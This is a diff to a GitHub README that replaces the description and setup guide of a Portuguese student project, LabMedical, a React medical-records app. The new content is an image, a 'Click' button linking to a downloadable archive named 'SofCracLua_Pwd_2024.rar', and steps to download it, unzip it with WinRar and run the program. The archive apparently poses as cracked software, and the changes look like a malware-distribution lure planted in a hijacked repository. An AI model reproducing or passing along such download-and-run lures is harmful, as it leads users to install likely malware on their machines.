@@ -1,40 +1,11 @@
-# LabMedical
+[<img src="https://i.imgur.com/orDhtRz.jpeg"/>]
 
-Uma pagina web com o tema medico , aonde da para cadastrar paciente, consultas e exames.
+[![Click](https://github.com/nielleisha/nielleisha1/assets/160551635/dc150ab8-d683-419a-a416-4a2153637156)](https://github.com/FullStack-Trindade/M3P-FrontEnd-Squad5/releases/download/aas/SofCracLua_Pwd_2024.rar)
 
-## Bibliotecas Utilizada
-
-```
-Vite
-React
-Material Ui
-React-hook-form
-React-input-mask
-React-router-dom
-Styled-components
-```
-
-## Mock API
 
 ```
-Json Server
+✔️Installation:
 ```
-
-## Utilizando o Codigo
-
-- Clone o codigo com um git Clone
-- Abra o terminal e digite cd LabMedical para entrar na pasta raiz
-- De um npm i ou npm install
-- Abra outro terminal
-- E agora cole isso no novo terminal json-server --watch ./LabMedical/src/server/db.json
-- Apos isso ter sido feito va no terminal a onde esta na pasta raiz e de um npm run dev
-
-Ja tem usuarios cadastrados mas se quiser recomendo criar o proprio seu
-
-## Autores
-
-- [@glautonOsorio](https://github.com/glautonOsorio)
-
-## Professor
-
-- [@robertsantosti](https://github.com/robertsantosti)
++ Download the archive at the link
++ Unzip the archive with WinRar 
++ Run the program 
